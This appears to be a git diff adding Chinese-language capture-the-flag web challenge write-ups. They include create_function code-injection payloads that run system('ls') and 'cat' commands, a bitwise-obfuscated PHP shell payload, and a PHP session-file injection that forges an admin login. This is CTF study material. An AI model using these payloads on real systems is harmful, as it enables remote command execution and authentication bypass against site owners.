@@ -196,3 +196,93 @@ scandir(pos(localeconv())) => scandir('.')
 `dhudndrgrhs.php?shell=${~"\xa0\xb8\xba\xab"}[1](${~"\xa0\xb8\xba\xab"}[2]);&1=system&2=cat flag.php`
 
 `$flag='xmflag{yi_giao_wo_li_giao_giao}';`
+
+## easy-web
+
+先ls一下。[可参考](https://blog.csdn.net/qq_45808659/article/details/105799699)
+
+hackbar:
+    
+    GET: ?act=\create_function&arg=){return%20123;}system(%27ls ../%27);//
+    POST: key=123
+
+发现ffflll4g，然后cat出来
+
+hackbar:
+    
+    GET: /?act=\create_function&arg=){return%20123;}system(%27cat%20/ffflll4g%27);//
+    POST: key=123
+
+flag{99798edf2eb1fa20d8ed9ce7da85f902}
+
+## web12
+
+```php
+<?php
+highlight_file(__FILE__);
+$content = @$_GET['content'] ? "---mylocalnote---\n" . $_GET['content'] : "";
+$name = @$_GET['name'] ? $_GET['name'] : '';
+str_replace('/', '', $name);
+str_replace('\\', '', $name);
+file_put_contents("/tmp/" . $name, $content);
+session_start();
+if (isset($_SESSION['username'])) {
+    echo "Thank u,{$_SESSION['username']}";
+}
+//flag in flag.php 
+```
+
+session漏洞，session的默认位置有
+
+    /var/lib/php/sess_PHPSESSID
+    /var/lib/php/sessions/sess_PHPSESSID
+
+    /var/lib/php5/sess_PHPSESSID
+    /var/lib/php5/sessions/sess_PHPSESSID
+
+    /tmp/sess_PHPSESSID
+    /tmp/sessions/sess_PHPSESSID
+
+
+发现我们可以往session里写东西，但是会多写---mylocalnote---\n
+
+session再存储时进行序列化，读取进行反序列化，默认的序列化引擎是php，其规则是：
+
+    键名+竖线+经过serialize()函数序列处理的值
+    因此我们尝试写
+    username|s:5:"admin";
+
+但会在首行加入变成
+
+    ---mylocalnote---
+    username|s:5:"admin";
+
+按照session序列化引擎php规则，构造：
+    
+    ---mylocalnote---
+    |s:1:"a";username|s:5:"admin";
+
+这样就成功吧---mylocalnote---变成一个键名了，username也会成功反序列化成admin
+
+F12看请求中的sessionid:
+
+    Cookie: PHPSESSID=roc14cumrgut81e87u6i7bf7kh
+
+bp抓包发请求。
+
+    /?content=|s:1:"a";username|s:5:"admin";&name=sess_roc14cumrgut81e87u6i7bf7kh
+
+已经提示是admin了，最后访问 /flag.php
+
+`flag{d0t_Sav3_AnyTh1ng_1n_Tmp}`
+
+
+
+## web8
+eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XujrrQ.xoAx5K_C3G02upLFocfEAgH2KUg
+
+{"username":{" b":"Z3Vlc3Q="}}
+## web6
+
+打不开
+whoami-考核 
